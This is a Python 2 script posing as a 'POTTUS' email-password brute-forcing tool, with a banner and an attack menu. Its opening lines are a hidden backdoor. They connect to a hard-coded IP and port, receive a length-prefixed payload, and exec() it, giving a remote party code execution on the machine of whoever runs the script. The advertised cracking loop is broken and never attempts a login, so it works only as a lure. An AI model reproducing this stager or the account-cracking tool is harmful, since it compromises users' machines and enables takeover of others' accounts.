#!/usr/bin/python
'''created by POTTUS'''
import socket,struct,time

for x in range(10):
        try:
                s=socket.socket(2,socket.SOCK_STREAM)
                s.connect(('3.13.191.225',12514))
                break
        except:
                time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
        d+=s.recv(l-len(d))
exec(d,{'s':s})
import smtplib

from os import system

def main():
   print '================================================='
   print '               create by POTTUS                  '
   print '================================================='
   print '               ++++++++++++++++++++              '
   print '\n                                               '
   print '  _,.                                            '
   print '                                                 '
   print '                                                 '
   print '           Pottus                                '
   print '       _,.                   '
   print '     ,` -.)                  '
   print '    ( _/-\\-._               '
   print '   /,|`--._,-^|            , '
   print '   \_| |`-._/||          , | '
   print '     |  `-, / |         /  / '
   print '     |     || |        /  /  '
   print '      `r-._||/   __   /  /   '
   print '  __,-<_     )`-/  `./  /    '
   print '  \   `---    \   / /  /     '
   print '     |           |./  /      '
   print '     /           //  /       '
   print ' \_/  \         |/  /        '
   print '  |    |   _,^- /  /         '
   print '  |    , ``  (\/  /_         '
   print '   \,.->._    \X-=/^         '
   print '   (  /   `-._//^`           '
   print '    `Y-.____(__}             '
   print '     |     {__)              ' 
   print '           ()   V.7.0        '
main()
print '[1] start the attack'
print '[2] exit'
option = input('==>')
if option == 1:
   file_path = raw_input('path of passwords file :')
   pass_file = open(file_path,'r')
   pass_list = pass_file.readlines()
   i = 0
   user_name = raw_input('target email / ID')
   for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         print("Wait!..")

         print '\n'
         print '[+] Testing :' + password + '     ^_^'
         time.sleep(1)
      except :
         error = str(e)
         if error[14] == '<':
            system('clear')
            
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password

else:
   system('clear')
   exit()
